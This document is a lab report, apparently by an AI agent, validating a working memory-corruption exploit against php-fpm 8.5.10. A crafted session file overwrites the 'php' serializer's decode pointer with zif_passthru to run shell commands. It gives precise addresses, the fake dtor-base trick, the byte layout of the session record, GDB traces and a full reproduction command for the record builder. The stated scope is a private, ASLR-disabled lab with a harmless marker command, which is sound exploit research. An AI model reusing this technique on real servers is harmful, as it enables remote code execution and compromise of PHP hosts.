# Entry-1 `php` serializer validation — realapps php-fpm 8.5.10

**Verdict: PASS.** With `session.serialize_handler=php`, the entry-1 decode slot
`ps_serializers[1].decode` (`0x22c54c8`) was overwritten with `zif_passthru`
(`0xa3c074`). The same request's second session decode dispatched to
`zif_passthru`, interpreted the re-encoded `php` session buffer as a fake
`execute_data`, and executed the command through `php_exec_ex` / `php_exec`.
Worker `153028` returned `PID=153028` and remained alive; the marker was created
at `2026-10-22 01:46:39 +0200`.

The entry-1 decode slot is misaligned with the 16-byte `var_dtor_entries` write
grid (slot ≡ 8 mod 16, real B0 page-aligned). The final record therefore used a
fake dtor base at `B0+8` with a negative `used_slots`, as detailed below. The
second zval write lands at `entry2.encode` / `entry2.decode`, and session
normalization clears `entry2.name`; the serializer array now terminates at
entry 2. Entry 1 remains intact and patched, and the current `php` request uses
the cached entry-1 pointer, so the worker survives. Entry 2 (`php_binary`)
becomes undiscoverable after this run; this is called out as a side effect.

---

## 1. Target and private lab

| Item | Value |
|---|---|
| Binary | `/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm` |
| MD5 | `4ee099823b75e16ea36f93c71d57bfd8` |
| PHP / SAPI | 8.5.10 / fpm-fcgi, non-ZTS |
| INI mode | plain `-n` lab; no MediaWiki |
| Loader path | `/tmp/opencode/realapps/icu-out/lib` |
| ASLR | disabled per instance (`setarch x86_64 -R`) |
| Lab root | `/tmp/opencode/research/realzif_php_20261022T014200Z` |
| Listener | `127.0.0.1:28890` (private; 28891/28892 shared nginx untouched) |
| Pool | `pm=static`, `pm.max_children=1`, `pm.max_requests=0` |
| Session handler | `session.save_handler=files`; `session.serialize_handler=php` |
| Master | `152643` |
| Initial worker | `152644` (calibration crash, see §4) |
| Final worker | `153028` |
| Upload progress | enabled, prefix `""`, name `PHP_SESSION_UPLOAD_PROGRESS`, cleanup off |

The only worker SIGSEGV in the lab was the calibration request on worker
`152644` at `01:42:28` (same calibration-only artifact seen in the prior entry-2
lab). The final request on worker `153028` did not crash; `fpm-error.log` has no
SIGSEGV after the final run.

## 2. Serializer table and slot mapping

`ps_serializers = 0x22c54a0`, struct stride `0x18`, `PS(serializer)` field at
`ps_globals+0x160 = 0x22d0f20`.

| idx | struct | name | encode | decode slot | real decode |
|---:|---|---|---|---|---|
| 0 | `0x22c54a0` | `php_serialize` (`0x1018ce1`) | `0x9e2078` | `0x22c54b0` | `0x9e20de` |
| **1** | **`0x22c54b8`** | **`php` (`0x1019353`)** | **`0x9e7112`** | **`0x22c54c8`** | **`0x9e6fae`** |
| 2 | `0x22c54d0` | `php_binary` (`0x1018cef`) | `0x9e6b15` | `0x22c54e0` | `0x9e6dd5` |

The patched function is `zif_passthru = 0xa3c074` (size `0x13`); the call path is
`php_exec_ex` (`0xa3bdfd`) → `php_exec` (`0xa3bbd7`), with the return probe at
`0xa3c047`.

## 3. Calibration

Record `sessions/sess_pcal` used the `php` format, total `131014`, `K=0`, and
`A=0x22c54c8` (no patch in calibration). Evidence:
`phase/calib_php_gdb.txt`, `phase/calib_php_req.json`, `phase/mkrec_pcal.json`.

| Measurement | Value |
|---|---|
| `X1` / hit-1 data | `0x7ffff466a000` |
| `X1` val | `0x7ffff466a018` |
| `T1` | `131014` |
| `X2` / hit-2 data | `0x7ffff468d000` |
| `X2` val | `0x7ffff468d018` |
| `T2` | `131313` |
| `pser` on both hits | `0x22c54b8` (**entry 1**, `php`) |
| hit-1 `ser1decode` | `0x9e6fae` |
| re-encoded buffer | `key(96) | i:10731636; z | s:130892:"…";` |
| fake fields in both buffers | raw `0x2c` num_args=1, raw `0x50` arg1, raw `0x58` type=6 |

The 96-byte key survived the `php` decoder and encoder binary-safely: the
decoder computes `namelen = q - p` and calls `zend_string_init(p, namelen, 0)`;
the encoder appends the full `zend_string` with `smart_str_append`. The key
contains NULs but no `|` (verified `any(b == 0x7c for b in d[:96]) == False`).

Worker `152644` crashed after calibration hit 2 (calibration artifact, consistent
with the prior entry-2 lab). FPM respawned worker `153028`; the plant was
re-applied and P/B0 re-measured identically.

## 4. Plant

`phase/plant2_state.txt` on worker `153028`:

| Field | Value |
|---|---|
| `BG(unserialize).level` | `1` |
| `BG(unserialize).data` / fake P | `0x7ffff4681000` |
| stale dtor bucket / real B0 | `0x7ffff4684000` |
| pre-exploit entry-1 decode | `0x9e6fae` |
| pre-exploit entry-1 encode | `0x9e7112` |

The fake P bytes are supplied by the session file itself at file offset
`P - (X1+0x18) = 0x16fe8`; the stale P/B0 addresses are covered by the session
buffer after the plant bailout.

## 5. Entry-1 alignment and the fake dtor base

`A = ps_serializers[1].decode = 0x22c54c8`. `A` ends in `0xc8`, i.e. `8 mod 16`.
The normal `var_dtor_entries` data grid is `B0 + 0x10 + 16*K`; with the real
page-aligned `B0 = 0x7ffff4684000` every destination is `0 mod 16`. The real B0
therefore cannot hit entry 1.

The final record points the fake P's `first_dtor` / `last_dtor` at a fake
`var_dtor_entries` base at `B0+8`:

| Field | Value |
|---|---|
| fake dtor base | `0x7ffff4684008` (`B0+8`, `8 mod 16`) |
| `used_slots` (`K`) | `-8796078587573` |
| `next` | `0` |
| destination check | `0x7ffff4684008 + 0x10 + 16*K = 0x22c54c8` |
| fake P `last` | `P+56 = 0x7ffff4681038` |
| fake P `entries.used_slots` | `1018` |

Why this is safe at runtime:

- `tmp_var` accepts `K` because `K + num > 255` is false for negative `K`; it
  writes `ZVAL_UNDEF` at `data[K] = A`, then the parser writes the integer
  (`0xa3c074`) there. The second temporary writes the string zval at `A+0x10`.
- `BG(unserialize).level` is `1` when the entry-1 decode starts. `init`
  increments it to `2`; `php_var_unserialize_destroy` only calls `var_destroy`
  when `level == 1`, so the fake interior dtor base is never `efree`'d.
- `php_session_normalize_vars` only normalizes the session hash; it does not walk
  the dtor chain.

## 6. Final record, hits, and marker

Final record: `sessions/sess_pfin`, `format=php`, total `131014`.

```text
[ 96-byte key ][|][ i:10731636; ][z][|][ s:130892:" ][ 130892-byte payload ][";]
      0..95     96    97..107    108 109     110..119      120..131011      131012..131013
```

Key bytes at raw `0x2c/0x50/0x58`: `num_args=1`, `arg1=F`, `arg1_type=6`.
`Q = 0x78`, `L = 130892`, `R = 108`, `T1 = 131014`.
`F = X2 + 0x18 + Q + 0x100 = 0x7ffff468d190`; command length `70`; command:

```text
touch /tmp/opencode/research/realzif_php_20261022T014200Z/PASSTHRU_PHP
```

Key GDB lines (`phase/final_php_gdb.txt`):

```text
DECODE hit=1 data=0x7ffff466a000 val=0x7ffff466a018 len=131014 level=1
  bgdata=0x7ffff4681000 pser=0x22c54b8 ser1decode=0x9e6fae
  ser1encode=0x9e7112 ser2decode=0x9e6dd5

DECODE hit=2 data=0x7ffff468d000 val=0x7ffff468d018 len=131313 level=1
  bgdata=0x7ffff4681000 pser=0x22c54b8 ser1decode=0xa3c074
  ser1encode=0x9e7112 ser2decode=(nil)

VAL2 RAW 0x2c numargs=1 0x50 arg1=0x7ffff468d190 0x58 type=6

ZIF_PASSTHRU hit rdi=0x7ffff468d018 rsi=0x200f1
PHP_EXEC_EX rdi=0x7ffff468d018 rsi=0x200f1 rdx=0x3
  numargs=1 arg1val=0x7ffff468d190 arg1type=6
  F=0x7ffff468d190 F+0x10(len)=70
  0x7ffff468d1a8: "touch /tmp/opencode/research/realzif_php_20261022T014200Z/PASSTHRU_PHP"
PHP_EXEC type=3 cmd=0x7ffff468d1a8 array=(nil) retval=0x200f1
AFTER_PHP_EXEC eax=0
```

The trigger response was `PID=153028`; marker:

```text
/tmp/opencode/research/realzif_php_20261022T014200Z/PASSTHRU_PHP size=0
mtime=2026-10-22 01:46:39.046256768 +0200
```

Post-exploit serializer table (`phase/final_post_ser.txt`):

```text
0x22c54a0: 0x0000000001018ce1 0x00000000009e2078   entry0 php_serialize name/encode
0x22c54b0: 0x00000000009e20de 0x0000000001019353   entry0 decode / entry1 name "php"
0x22c54c0: 0x00000000009e7112 0x0000000000a3c074   entry1 encode / entry1 decode = zif_passthru
0x22c54d0: 0x0000000000000000 0x00007ffff468d000   entry2 name = NULL / entry2 encode = X2
0x22c54e0: 0x0000000000000000                     entry2 decode = 0
```

`ser.gdb` prints:

```text
$1 = {name = 0x1018ce1 "php_serialize", encode = 0x9e2078, decode = 0x9e20de}
$2 = {name = 0x1019353 "php", encode = 0x9e7112, decode = 0xa3c074 <zif_passthru>}
$3 = {name = 0x0, encode = 0x7ffff468d000, decode = 0x0}
```

Entry 1 is patched exactly as intended: `ps_serializers[1].decode = 0xa3c074`.
The second zval write occupied `entry2.encode`; `php_session_normalize_vars`
set the type word at `entry2.name` to `IS_UNDEF` (0) and the type word at
`entry2.decode` to 0. Because `entry2.name` is now NULL, the `ps_serializers`
array terminates at entry 2: `php_binary` is no longer discoverable. Entry 1's
name, encode and patched decode remain valid; the current request has the entry-1
pointer cached in `PS(serializer)`, so dispatch and encode both survive.

## 7. Payload / format delta versus entry 2 (`php_binary`)

| Property | Entry 2 `php_binary` (prior lab) | Entry 1 `php` (this lab) |
|---|---|---|
| Decode slot | `0x22c54e0` | **`0x22c54c8`** |
| Struct | `0x22c54d0` | **`0x22c54b8`** |
| Record 1 | `\x60` + key(96) + serialized value | key(96) + `|` + serialized value |
| Record 2 | `\x01z` + `s:130892:"…";` | `z|` + `s:130892:"…";` |
| Key boundary | explicit length byte at raw 0; key at raw 1..96 | `|` at raw 96; key at raw 0..95 |
| Fake fields | raw `0x2c/0x50/0x58` (key indices `0x2b/0x4f/0x57`) | raw `0x2c/0x50/0x58` (key indices `0x2c/0x50/0x58`) |
| Key binary safety | length-prefixed, NUL-safe by construction | `namelen` scan + `zend_string_init`; encoder uses `smart_str_append`; NULs preserved; key must not contain `|` |
| `Q` / payload start | `0x78` | `0x78` |
| `T1` / `T2` | `131014` / `131313` | `131014` / `131313` |
| `F` | `X2+0x190` | `X2+0x190` |
| Write grid | real B0 `0x7ffff4684000`, slot `0x22c54e0` is 16-aligned | fake dtor base `0x7ffff4684008` (`B0+8`), slot `0x22c54c8` is 8 mod 16 |
| `K` | `-8796078587571` | `-8796078587573` |
| Post write side effect | entry3 (terminator) name zeroed; entry3.encode gets X2 string pointer; entry3.decode 0 | entry2 (`php_binary`) name zeroed; entry2.encode gets X2 string pointer; entry2.decode 0 |

The record lengths and payload offset are deliberately identical between the
two formats for the same key/value/target sizes: replacing the length byte with
`|` and `\x01z` with `z|` preserves the prefix sizes, hence `Q=0x78`,
`T1=131014`, and the re-encoded `T2=131313`. The only source-level difference
that affects the exploit is the raw key offset (entry 1 has no length byte) and
the entry-1 slot's 8-mod-16 alignment.

## 8. Worker survival

- Trigger request: HTTP 200, body `PID=153028`, no connection reset.
- Marker created by the passthru command; no post-command SIGSEGV.
- Worker `153028` remained alive after the trigger; a later session-less probe
  also returned `PID=153028`.
- `fpm-error.log` shows no SIGSEGV after the final trigger; only the
  calibration worker `152644` crash at `01:42:28`.
- Master `152643` was terminated at `01:47:08`; port `28890` closed. Shared nginx
  on `28891`/`28892` was not signalled or connected to.

## 9. Artifacts

| Path | Contents |
|---|---|
| `phase/calib_php_gdb.txt` | hit 1/2, X1/X2, T2, `pser=0x22c54b8`, `ser1decode` real, re-encoded buffer fields |
| `phase/mkrec_pcal.json`, `phase/mkrec_pcal.out` | calibration record metadata |
| `phase/plant1_state.txt`, `phase/plant1_ser.txt` | initial plant level=1, P/B0, pre-exploit table |
| `phase/plant2_state.txt` | re-plant on worker 153028 |
| `phase/final_php_gdb.txt` | decisive final hits, `zif_passthru`, `php_exec_ex`, `php_exec`, `AFTER eax=0` |
| `phase/final_php_req.json` | trigger response (`PID=153028`) |
| `phase/mkrec_pfin.json`, `phase/mkrec_pfin.out` | final record metadata, `K`, destination check |
| `phase/final_post_ser.txt` | post-exploit serializer table (entry1 patched, entry2 side effect) |
| `phase/final_post_state.txt` | post-run `BG(unserialize).level=0`, `data=NULL` |
| `phase/marker_stat.txt`, `phase/final_procs.txt`, `phase/final_port.txt`, `phase/final_fpm_tail.txt`, `phase/final_probe.json` | marker stat, worker/master PIDs, port state, FPM tail, post-run probe |
| `sessions/sess_pcal`, `sessions/sess_pfin` | calibration / final `php`-format session files |
| `PASSTHRU_PHP` | marker created by the exploit |
| `scripts/mkrec_php.py` | `php` / `php_binary` record builder; `--dtor` selects the fake dtor base |
| `gdb/final_php.gdb`, `gdb/calib_php.gdb`, `gdb/state.gdb`, `gdb/ser.gdb` | instrumentation |

## 10. Reproduction outline

1. Start the private FPM with `conf/fpm.conf` (`session.serialize_handler=php`,
   port `28890`, ASLR disabled) and probe.
2. Plant `BG(unserialize).level=1` and stale P/B0 with `drv.py plant`; measure
   with `state.gdb`.
3. Calibrate with `mkrec_php.py --mode calib --format php` and a `K=0` record;
   record X1/X2/T2. Calibration worker may SIGSEGV after hit 2; let FPM respawn.
4. Re-plant, then build the final record:

   ```bash
   python3 scripts/mkrec_php.py --out sessions/sess_pfin \
     --x1 0x7ffff466a000 --x2 0x7ffff468d000 \
     --p 0x7ffff4681000 --b0 0x7ffff4684000 --dtor 0x7ffff4684008 \
     --total 131014 --mode final --format php \
     --target 0xa3c074 --a-target 0x22c54c8 \
     --cmd "touch $LAB/PASSTHRU_PHP"
   ```

5. Attach `gdb/final_php.gdb` to the worker, send `drv.py trigger pfin`, then
   check marker, same worker PID, `ser1decode=0xa3c074`, and the post-run
   `ser.gdb` table.

**Scope:** private lab only. No shared `4052217`, `4052937`, `4053032`,
`4054145`; no MediaWiki; shared nginx ports `28891`/`28892` were left alone.
